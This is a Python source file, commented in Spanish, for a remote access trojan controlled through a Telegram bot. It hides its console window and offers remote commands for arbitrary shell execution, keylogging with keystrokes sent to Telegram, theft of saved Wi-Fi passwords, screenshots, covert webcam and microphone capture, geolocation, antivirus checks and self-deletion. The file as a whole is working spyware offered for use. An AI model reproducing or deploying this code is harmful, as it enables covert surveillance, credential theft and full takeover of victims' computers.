

import logging
import os
import io
import socket
import platform
import cv2
import numpy as np
import sounddevice as sd
import wavio
from PIL import ImageGrab
import keyboard
import psutil
import winreg
import time
import requests
import ctypes
import re
from typing import List, Tuple, Dict
import datetime
from telegram import Bot, Update
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters,
)
import asyncio
import keyboard
import subprocess
from pynput import keyboard
import logging
import win32console
import ctypes
import win32gui
import win32console
import win32gui
import win32con
from datetime import datetime

# esta parte es para que se oculte la consola capo, LLegas a modificar algo y
# Cagaste Feo, asi que OJO al Piojo
hwnd = win32console.GetConsoleWindow()

# Si hay una ventana de consola, ocúltala
if hwnd:
    win32gui.ShowWindow(hwnd, win32con.SW_HIDE)



logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

TOKEN = ''




def obtener_datos_dispositivo():
    """Obtiene el nombre del dispositivo y su IP local."""
    nombre_dispositivo = socket.gethostname()
    ip_local = socket.gethostbyname(nombre_dispositivo)
    return nombre_dispositivo, ip_local

def enviar_mensaje_activacion(chat_id):
    """Envía un mensaje al bot de Telegram con los datos de conexión."""
    nombre_dispositivo, ip_local = obtener_datos_dispositivo()
    hora_actual = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    mensaje = f"Conexión Activa {hora_actual} - {nombre_dispositivo} - {ip_local}"
    
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {
        'chat_id': chat_id,
        'text': mensaje
    }
    
    response = requests.post(url, data=payload)
    if response.status_code == 200:
        print("Mensaje enviado con éxito.")
    else:
        print("Error al enviar el mensaje.")

# Función para obtener el chat_id del último mensaje recibido (usualmente el ID del chat donde se ejecuta el comando)
def obtener_chat_id_ultimo_mensaje():
    url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
    response = requests.get(url)
    if response.status_code == 200:
        data = response.json()
        if data['result']:
            chat_id = data['result'][-1]['message']['chat']['id']
            return chat_id
    print("Error al obtener el chat_id.")
    return None

# Llama a esta función al final de tu script para notificar que el bot está activo
chat_id = obtener_chat_id_ultimo_mensaje()
if chat_id:
    enviar_mensaje_activacion(chat_id)
else:
    print("No se pudo obtener el chat_id.")




import subprocess

Redes = {}

def getESSIDs() -> None:
    global Redes
    ESSID = []

    try:
        # Usamos 'latin-1' para manejar caracteres especiales que pueden no estar en 'utf-8'
        Cadena = subprocess.check_output("netsh wlan show profiles", shell=True, text=True, encoding='latin-1')
        Cadena = Cadena.split("Perfil de todos los usuarios")

        for x in Cadena:
            x = x.replace("\n", "").strip().replace(": ", "").split("Perfiles de directiva de grupo")[0]
            ESSID.append(x)
        
        Redes["Interfaz"] = ESSID[:1]
        Redes["ESSID"] = ESSID[1:]
    except subprocess.CalledProcessError:
        Redes["ESSID"] = ["Error al obtener redes Wi-Fi"]

def getPass() -> None:
    global Redes
    Seguridad = ""
    Passwd = ""
    Seg = []
    Pwd = []

    for x in Redes["ESSID"]:
        try:
            Cadena = subprocess.check_output(
                f"netsh wlan show profiles name=\"{x}\" key=clear", shell=True, text=True, encoding='latin-1'
            )
            # Procesamos posibles caracteres no estándar
            Cadena = (Cadena.replace("Ç­", "á").replace("Ç¸", "é")
                        .replace("Çð", "í").replace("Çü", "ó")
                        .replace("Ç§", "ú"))
            Cadena = Cadena.split("Configuración de seguridad")[-1]
            Cadena = Cadena.split("Configuración de costos")[0]
            Cadena = Cadena.split("\n")[2:]
            
            for y in Cadena:
                if "Autenticación" in y:
                    Seguridad = y.split("Autenticación")[-1]
                elif "Contenido de la clave" in y:
                    Passwd = y.split("Contenido de la clave")[-1]
            
            Seguridad = Seguridad.strip().replace(": ", "").replace("-Personal", "").replace("Abierta", "WEP")
            Passwd = Passwd.strip().replace(": ", "")
            
            Seg.append(Seguridad)
            Pwd.append(Passwd)
        
        except subprocess.CalledProcessError:
            Seg.append("Error al obtener seguridad")
            Pwd.append("Error al obtener contraseña")
    
    Redes["SEG"] = Seg
    Redes["PWD"] = Pwd

async def gestionar_redes_wifi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    try:
        getESSIDs()
        getPass()
        if Redes["ESSID"]:
            mensaje = "Redes Wi-Fi almacenadas:\n"
            for i, essid in enumerate(Redes["ESSID"]):
                contraseña = Redes["PWD"][i] if i < len(Redes["PWD"]) else "Sin contraseña"
                mensaje += f"{i+1}) {essid} - {contraseña}\n"
        else:
            mensaje = "No se encontraron redes Wi-Fi almacenadas."
    except Exception as e:
        mensaje = f"Error al obtener redes Wi-Fi: {str(e)}"

    await update.message.reply_text(mensaje)
    






def obtener_estado_antivirus() -> str:
    try:
        resultado = subprocess.check_output('sc query WinDefend', shell=True, text=True, encoding='utf-8')
        if 'RUNNING' in resultado:
            return "El antivirus de Windows está ACTIVADO."
        elif 'STOPPED' in resultado:
            return "El antivirus de Windows está DESACTIVADO."
        else:
            return "No se pudo determinar el estado del antivirus."
    except subprocess.CalledProcessError:
        return "Error al obtener el estado del antivirus."

async def estado_antivirus(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    estado = obtener_estado_antivirus()
    await update.message.reply_text(estado)

async def apagar_pc(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    try:
        if platform.system() == "Windows":
            os.system("shutdown /s /t 0")
        elif platform.system() == "Linux":
            os.system("shutdown now")
        elif platform.system() == "Darwin":
            os.system("sudo shutdown -h now")
        await update.message.reply_text("El PC se está apagando...")
    except Exception as e:
        await update.message.reply_text(f'Ocurrió un error al apagar el PC: {e}')

async def reiniciar_pc(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    try:
        if platform.system() == "Windows":
            os.system("shutdown /r /t 0")
        elif platform.system() == "Linux":
            os.system("reboot")
        elif platform.system() == "Darwin":
            os.system("sudo reboot")
        await update.message.reply_text("El PC se está reiniciando...")
    except Exception as e:
        await update.message.reply_text(f'Ocurrió un error al reiniciar el PC: {e}')

async def suspender_pc(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    try:
        if platform.system() == "Windows":
            ctypes.windll.PowrProf.SetSuspendState(0, 0, 0)
        elif platform.system() == "Linux":
            os.system("systemctl suspend")
        elif platform.system() == "Darwin":
            os.system("pmset sleepnow")
        await update.message.reply_text("El PC se está suspendiendo...")
    except Exception as e:
        await update.message.reply_text(f'Ocurrió un error al suspender el PC: {e}')

async def obtener_ubicacion(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    try:
        response = requests.get("https://ipinfo.io/json")
        data = response.json()
        loc_info = (f"Ubicación detectada:\n"
                    f"Ciudad: {data.get('city', 'No disponible')}\n"
                    f"Región: {data.get('region', 'No disponible')}\n"
                    f"País: {data.get('country', 'No disponible')}\n"
                    f"IP Pública: {data.get('ip', 'No disponible')}")
        await update.message.reply_text(loc_info)
    except Exception as e:
        await update.message.reply_text(f'Ocurrió un error al obtener la ubicación: {e}')

async def scan_malware(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    try:
        malware_list = ["trojan", "miner", "crypto", "malware"]
        process_list = [proc.name().lower() for proc in psutil.process_iter()]
        detected_malware = [proc for proc in process_list if any(malware in proc for malware in malware_list)]
        
        if detected_malware:
            await update.message.reply_text(f"Se detectaron posibles programas maliciosos: {', '.join(detected_malware)}")
        else:
            await update.message.reply_text("No se detectaron programas maliciosos.")
    except Exception as e:
        await update.message.reply_text(f'Ocurrió un error al escanear los programas: {e}')

async def red_info(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    try:
        net_io = psutil.net_io_counters()
        subida = net_io.bytes_sent / (1024 ** 2)
        descarga = net_io.bytes_recv / (1024 ** 2)
        await update.message.reply_text(
            f"Uso de red actual:\n"
            f"Subida: {subida:.2f} MB\n"
            f"Descarga: {descarga:.2f} MB"
        )
    except Exception as e:
        await update.message.reply_text(f'Ocurrió un error al obtener la información de la red: {e}')





async def Terminar_Conexion(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    try:
        # Enviar mensaje de conexión terminada al bot
        await update.message.reply_text('Conexión terminada. El bot se cerrará y se eliminará.')

        # Obtener la ruta del archivo actual
        script_file = os.path.abspath(__file__)

        # Eliminar el archivo actual
        os.remove(script_file)

        # Finalizar la ejecución del script
        os._exit(0)  # Usa os._exit(0) para asegurarte de que el script termine inmediatamente

    except Exception as e:
        await update.message.reply_text(f'Ocurrió un error al intentar eliminar el bot: {e}')







async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text('¿En qué puedo ayudarte?')







# llave de acceso lista para su uso
# llave de acceso lista para su uso
class MonitorTeclas:
    def __init__(self, token_bot):
        self.texto = ""
        self.contador = 0
        self.token_bot = token_bot
        self.directorio_log = os.path.join(os.path.dirname(os.path.dirname(__file__)), "log")
        self.activo = False
        self.registro_teclas = []
        self.id_chat = None
        self.evento_loop = asyncio.get_event_loop()
        self.listener = None  # Agrego esta variable para almacenar el listener

        if not os.path.exists(self.directorio_log):
            os.mkdir(self.directorio_log)

        logging.basicConfig(filename=os.path.join(self.directorio_log, "log.log"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
        self.bot = Bot(token=self.token_bot)

    async def alternar_monitor(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        if not self.activo:
            await update.message.reply_text('Monitor de teclas activado. Las teclas se enviarán por mensajes.')
            self.listener = keyboard.Listener(on_press=self.en_presionar)
            self.listener.start()
            self.activo = True
        else:
            if self.listener:  # Verifico si hay un listener activo
                self.listener.stop()
            await update.message.reply_text('Monitor de teclas desactivado.')
            self.activo = False

    def en_presionar(self, tecla):
        try:
            caracter_tecla = tecla.char
        except AttributeError:
            # Convertir teclas especiales a cadena
            if tecla == keyboard.Key.space:
                caracter_tecla = '[Espacio]'
            elif tecla == keyboard.Key.enter:
                caracter_tecla = '[Enter]'
            elif tecla == keyboard.Key.tab:
                caracter_tecla = '[Tab]'
            elif tecla == keyboard.Key.esc:
                caracter_tecla = '[Esc]'
            elif tecla == keyboard.Key.shift:
                caracter_tecla = '[Shift]'
            elif tecla == keyboard.Key.ctrl:
                caracter_tecla = '[Ctrl]'
            elif tecla == keyboard.Key.alt:
                caracter_tecla = '[Alt]'
            elif tecla == keyboard.Key.left:
                caracter_tecla = '[Flecha Izquierda]'
            elif tecla == keyboard.Key.right:
                caracter_tecla = '[Flecha Derecha]'
            elif tecla == keyboard.Key.up:
                caracter_tecla = '[Flecha Arriba]'
            elif tecla == keyboard.Key.down:
                caracter_tecla = '[Flecha Abajo]'
            else:
                caracter_tecla = f'[{tecla}]'

        if caracter_tecla in ('[Espacio]', '[Enter]'):
            asyncio.run_coroutine_threadsafe(self.enviar_a_telegram(''.join(self.registro_teclas)), self.evento_loop)
            self.registro_teclas.clear()
        else:
            self.registro_teclas.append(caracter_tecla)

    async def enviar_a_telegram(self, mensaje):
        try:
            if self.id_chat:
                await self.bot.send_message(chat_id=self.id_chat, text=f'Teclas: {mensaje}')
        except Exception as e:
            logging.error(f"Error al enviar mensaje a Telegram: {e}")

async def comando_monitor(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if monitor.activo:  # Verifico si el monitor ya está activo
        await monitor.alternar_monitor(update, context)  # Lo desactivo
    else:
        monitor.id_chat = update.effective_chat.id
        await monitor.alternar_monitor(update, context)  # Lo activo

monitor = MonitorTeclas(TOKEN)



    




async def shell(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if context.args:
        command = ' '.join(context.args)
        await ejecutar_comando_shell(update, command)
    else:
        await update.message.reply_text('Por favor, proporciona un comando para ejecutar.')

async def ejecutar_comando_shell(update: Update, command: str) -> None:
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout + result.stderr
        if output:
            safe_output = output.replace('_', '\\_').replace('*', '\\*').replace('`', '\\`')
            await update.message.reply_text(f'```\n{safe_output}\n```', parse_mode='MarkdownV2')
        else:
            await update.message.reply_text(f'El comando se ejecutó correctamente pero no produjo salida.\n /start')
    except Exception as e:
        await update.message.reply_text(f'Ocurrió un error al ejecutar el comando: {e}\n /start')

async def screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    try:
        img = ImageGrab.grab()
        buf = io.BytesIO()
        img.save(buf, format='PNG')
        buf.seek(0)
        await context.bot.send_photo(chat_id=update.message.chat_id, photo=buf)
    except Exception as e:
        await update.message.reply_text(f'Ocurrió un error al capturar la pantalla: {e}')

def obtener_info_sistema() -> list:
    info = []
    
    try:
        hostname = socket.gethostname()
        info.append(f"Nombre del equipo: {hostname}")
        ip_address = socket.gethostbyname(hostname)
        info.append(f"Dirección IP: {ip_address}")
    except Exception as e:
        info.append(f"Error obteniendo dirección IP: {e}")

    try:
        interfaces = psutil.net_if_addrs()
        mac_address = 'No Encontrado'
        for interface in interfaces:
            for addr in interfaces[interface]:
                if addr.family == psutil.AF_LINK:
                    mac_address = addr.address
                    break
        info.append(f"Dirección MAC: {mac_address}")
    except Exception:
        info.append("Dirección MAC: No Encontrado")

    try:
        info.append(f"Procesador: {platform.processor()}")
        info.append(f"Núcleos de CPU: {psutil.cpu_count(logical=True)}")
        ram_info = psutil.virtual_memory()
        info.append(f"RAM Total: {ram_info.total / (1024 ** 3):.2f} GB")
    except Exception:
        info.append("No se pudo obtener información del sistema")

    return info

async def info_sistema(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    info = obtener_info_sistema()
    await update.message.reply_text('\n'.join(info))

async def wallpaper(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
   await update.message.reply_text("Obteniendo el fondo de pantalla, por favor espera...")

   try:
       if platform.system() == "Windows":
           reg_path = r"Control Panel\Desktop"
           with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path) as reg_key:
               wallpaper_path, _ = winreg.QueryValueEx(reg_key, "Wallpaper")

           with open(wallpaper_path, "rb") as f:
               img_data = f.read()

           buffer = io.BytesIO(img_data)
           buffer.seek(0)
           await context.bot.send_photo(chat_id=update.message.chat_id, photo=buffer)
       else:
           await update.message.reply_text("El comando /wallpaper solo está disponible en Windows.")
   except Exception as e:
       await update.message.reply_text(f'Ocurrió un error al obtener la imagen del fondo de pantalla: {e}')

       
async def cap(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
   num_captures = 1
   if context.args:
       try:
           num_captures = int(context.args[0])
           if num_captures < 1:
               raise ValueError
       except ValueError:
           await update.message.reply_text('Cantidad inválida, usando 1 captura por defecto.')
   
   await update.message.reply_text(f'Capturando {num_captures} imagen(es), por favor espera...')
   
   for i in range(num_captures):
       await capturar_y_enviar_imagen(update, context, i)

async def capturar_y_enviar_imagen(update: Update, context: ContextTypes.DEFAULT_TYPE, index: int):
   try:
       cap = cv2.VideoCapture(0)
       ret, frame = cap.read()
       cap.release()

       if ret:
           img_name = f"captura_{index}.jpg"
           cv2.imwrite(img_name, frame)
           
           with open(img_name, "rb") as f:
               await context.bot.send_photo(chat_id=update.message.chat_id, photo=f)
           
           os.remove(img_name)
       else:
           await update.message.reply_text('No se pudo capturar la imagen.')
   except Exception as e:
       await update.message.reply_text(f'Ocurrió un error al capturar la imagen: {e}')

async def record_audio(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
   num_seconds = 5
   if context.args:
       try:
           num_seconds = int(context.args[0])
           if num_seconds <= 0:
               raise ValueError
       except ValueError:
           await update.message.reply_text('Duración inválida, usando 5 segundos por defecto.')
   
   await update.message.reply_text(f'Grabando audio por {num_seconds} segundos, por favor espera...')
   
   # Grabar audio
   fs = 44100
   duration = num_seconds
   myrecording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
   sd.wait()
   
   # Guardar audio en un archivo WAV
   wavio.write("audio.wav", myrecording, fs, sampwidth=2)
   
   # Enviar archivo de audio a Telegram
   with open("audio.wav", "rb") as f:
       await context.bot.send_audio(chat_id=update.message.chat_id, audio=f)
   
   # Eliminar archivo de audio temporal
   os.remove("audio.wav")
nombre_dispositivo = socket.gethostname()
ip_dispositivo = socket.gethostbyname(socket.gethostname())

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    mensaje = f"*Nombre del dispositivo:* {nombre_dispositivo}\n*IP del dispositivo:* {ip_dispositivo}\n\n"
    mensaje += "*¡Bienvenido! Este es un bot remoto.*\n\n"
    mensaje += "*Aquí tienes la lista de comandos disponibles:*\n\n"
    mensaje += "/help: *Muestra esta ayuda*\n"
    mensaje += "/shell <comando>: *Ejecuta un comando en la shell del sistema*\n"
    mensaje += "/screenshot: *Captura una imagen de la pantalla*\n"
    mensaje += "/info: *Muestra información del sistema*\n"
    mensaje += "/wallpaper: *Obtiene el fondo de pantalla actual*\n"
    mensaje += "/cap <número>: *Captura una imagen de la cámara (número de capturas)*\n"
    mensaje += "/record_audio <segundos>: *Graba un audio de la entrada de audio (duración en segundos)*\n"
    mensaje += "/monitor: *Activa o desactiva el monitor de teclas*\n"
    mensaje += "/estado_antivirus: *Muestra el estado del antivirus*\n"
    mensaje += "/apagar_pc: *Apaga el PC*\n"
    mensaje += "/reiniciar_pc: *Reinicia el PC*\n"
    mensaje += "/suspender_pc: *Suspende el PC*\n"
    mensaje += "/obtener_ubicacion: *Obtiene la ubicación actual*\n"
    mensaje += "/scan_malware: *Escanea el sistema en busca de malware*\n"
    mensaje += "/Terminar_Conexion: *Termina la conexión y se eliminará a sí mismo*\n"
    mensaje += "/gestionar_redes_wifi: *Obtén nombres y contraseñas WIFI almacenadas*\n"
    
    await update.message.reply_text(mensaje, parse_mode="Markdown")

# Función main
def main():
    # Inicializar el bot
    application = Application.builder().token(TOKEN).build()

    # Agregar comandos
    application.add_handler(CommandHandler('start', start_command))
    application.add_handler(CommandHandler('help', help_command))
    application.add_handler(CommandHandler('shell', shell))
    application.add_handler(CommandHandler('screenshot', screenshot))
    application.add_handler(CommandHandler('info', info_sistema))
    application.add_handler(CommandHandler('wallpaper', wallpaper))
    application.add_handler(CommandHandler('cap', cap))
    application.add_handler(CommandHandler('record_audio', record_audio))
    application.add_handler(CommandHandler('monitor', comando_monitor))
    application.add_handler(CommandHandler('estado_antivirus', estado_antivirus))
    application.add_handler(CommandHandler('apagar_pc', apagar_pc))
    application.add_handler(CommandHandler('reiniciar_pc', reiniciar_pc))
    application.add_handler(CommandHandler('suspender_pc', suspender_pc))
    application.add_handler(CommandHandler('obtener_ubicacion', obtener_ubicacion))
    application.add_handler(CommandHandler('scan_malware', scan_malware))
    application.add_handler(CommandHandler('Terminar_Conexion', Terminar_Conexion))
    application.add_handler(CommandHandler('gestionar_redes_wifi', gestionar_redes_wifi))

    # Enviar mensaje de activación cuando se inicia el bot
    chat_id = obtener_chat_id_ultimo_mensaje()
    if chat_id:
        enviar_mensaje_activacion(chat_id)

    # Iniciar el bot
    application.run_polling()
if __name__ == '__main__':
    main()
